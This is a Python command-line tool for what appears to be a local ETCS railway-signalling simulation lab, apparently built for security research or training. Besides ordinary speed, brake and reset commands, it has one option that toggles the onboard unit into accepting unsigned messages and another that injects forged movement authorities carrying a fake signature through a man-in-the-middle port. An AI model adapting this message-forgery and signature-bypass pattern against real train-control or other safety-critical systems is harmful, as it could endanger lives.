#!/usr/bin/env python3

import json
import socket

DRIVER_HOST = "127.0.0.1"  # host-mapped EVC driver interface
DRIVER_PORT = 9102

ATTACK_HOST = "127.0.0.1"  # host-mapped GSM-R admin / MITM interface
ATTACK_PORT = 9100


def send_driver_command(cmd: str) -> str:
    """Send a single-line driver command to the EVC and return response text."""
    try:
        with socket.create_connection((DRIVER_HOST, DRIVER_PORT), timeout=2.0) as s:
            s.sendall((cmd + "\n").encode("utf-8"))
            try:
                s.settimeout(2.0)
                data = s.recv(4096)
            except socket.timeout:
                return f"{cmd} -> no reply (timeout)"
            if not data:
                return f"{cmd} -> connection closed"
            return data.decode("utf-8", errors="ignore").strip()
    except OSError as exc:
        return f"FAILED to send '{cmd}': {exc}"


def send_attack_ma(position_km: float, next_checkpoint_km: float, speed_limit: float) -> str:
    """Inject a fake MA towards the train via the GSM-R admin port."""
    payload = {
        "type": "MA",
        "ma_id": int(position_km * 1000),  # arbitrary id
        "position_km": float(position_km),
        "next_checkpoint_km": float(next_checkpoint_km),
        "speed_limit": float(speed_limit),
        "message": "CLI_ATTACK",
    }
    wrapper = {"payload": payload, "signature": "00deadbeef"}
    line = json.dumps(wrapper)
    try:
        with socket.create_connection((ATTACK_HOST, ATTACK_PORT), timeout=2.0) as s:
            s.sendall((line + "\n").encode("utf-8"))
        return f"Sent attack MA: {line}"
    except OSError as exc:
        return f"FAILED to send attack MA: {exc}"


def menu() -> None:
    accept_unsigned = False
    print("ETCS CLI control (no browser, no Tk)")
    print("Make sure docker compose stack is running (rbc, gsmr, radio, evc).\n")

    while True:
        print("Menu:")
        print("  1) Set train speed")
        print("  2) Brake / Stop")
        print("  3) Reset scenario")
        print("  4) Toggle signature policy (STRICT / RELAXED)")
        print("  5) Send attack MA towards train")
        print("  q) Quit")
        choice = input("> ").strip().lower()

        if choice == "1":
            val = input("Enter target speed (km/h): ").strip()
            try:
                speed = float(val)
            except ValueError:
                print("  Invalid speed, must be a number.\n")
                continue
            resp = send_driver_command(f"SPEED {speed}")
            print("  ", resp, "\n")

        elif choice == "2":
            resp = send_driver_command("BRAKE")
            print("  ", resp, "\n")

        elif choice == "3":
            resp = send_driver_command("RESET")
            print("  ", resp, "\n")

        elif choice == "4":
            accept_unsigned = not accept_unsigned
            cmd = "UNSIGNED ON" if accept_unsigned else "UNSIGNED OFF"
            resp = send_driver_command(cmd)
            mode = "RELAXED (accept unsigned)" if accept_unsigned else "STRICT (signed only)"
            print(f"  Policy now: {mode}")
            print("  ", resp, "\n")

        elif choice == "5":
            p = input("  position_km (e.g. 1.0): ").strip() or "0"
            n = input("  next_checkpoint_km (e.g. 2.0): ").strip() or "0"
            s = input("  speed_limit km/h (e.g. 150): ").strip() or "0"
            try:
                pos = float(p)
                nxt = float(n)
                spd = float(s)
            except ValueError:
                print("  Invalid values; all must be numbers.\n")
                continue
            resp = send_attack_ma(pos, nxt, spd)
            print("  ", resp, "\n")

        elif choice == "q":
            print("Bye.")
            break

        else:
            print("  Unknown choice, please pick 1-5 or q.\n")


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print("\nInterrupted, exiting.")
